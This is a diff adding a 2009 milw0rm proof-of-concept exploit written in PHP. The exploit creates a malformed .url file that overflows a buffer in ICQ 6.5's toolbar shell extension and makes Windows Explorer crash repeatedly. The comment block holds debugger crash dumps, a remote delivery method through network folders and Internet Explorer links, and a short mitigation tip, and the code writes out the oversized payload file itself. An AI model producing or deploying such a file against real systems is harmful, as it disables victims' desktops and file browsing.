@@ -1,0 +1,50 @@
+<?php
+/*
+ICQ 6.5 URL Search Hook/ICQToolBar.dll .URL file processing Windows Explorer
+remote buffer overflow poc
+by Nine:Situations:Group::pyrokinesis
+site: http://retrogod.altervista.org/
+
+If the resulting file is placed on the desktop, against ex. xp sp3
+process explorer.exe will exit with code 1282 (0x502) that is
+ERROR_STACK_BUFFER_OVERRUN and crash infinitely, you cannot even browse a folder
+if the file is present in it
+Solution: disable the shell extension, you may try shellexview by nirsoft
+
+Note (added 30/05/2009, remote vector added): it works with network folders
+too ...
+
+against a win2k3 where explorer.exe is not patched with /GS flag:
+
+(f44.104): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=02100068 ebx=772a23c1 ecx=0210cefa edx=00000823 esi=00610061 edi=00000000
+eip=772a533f esp=0210cec0 ebp=0210cec4 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+SHLWAPI!Ordinal400+0x2d:
+772a533f 668906          mov     word ptr [esi],ax        ds:0023:00610061=???? <-----
+0:010> g
+(f44.104): Access violation - code c0000005 (!!! second chance !!!)
+eax=02100068 ebx=772a23c1 ecx=0210cefa edx=00000823 esi=00610061 edi=00000000
+eip=772a533f esp=0210cec0 ebp=0210cec4 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+SHLWAPI!Ordinal400+0x2d:
+772a533f 668906          mov     word ptr [esi],ax        ds:0023:00610061=???? <-----
+0:010> gn
+eax=00000001 ebx=00000000 ecx=00000000 edx=00000000 esi=00000000 edi=00000001
+eip=7ffe0304 esp=0178fcf0 ebp=0178ff44 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+SharedUserData!SystemCallStub+0x4:
+7ffe0304 c3              ret
+
+prepare a network folder with the .url file inside. This works
+against Internet Explorer too by a hyperlink to the network folder
+*/
+
+$____x = "[InternetShortcut]\x0d\x0a".
+         "URL=".str_repeat("\x61",2184);
+file_put_contents("9sg_poc.url",$____x);
+?>
+
+# milw0rm.com [2009-06-01]
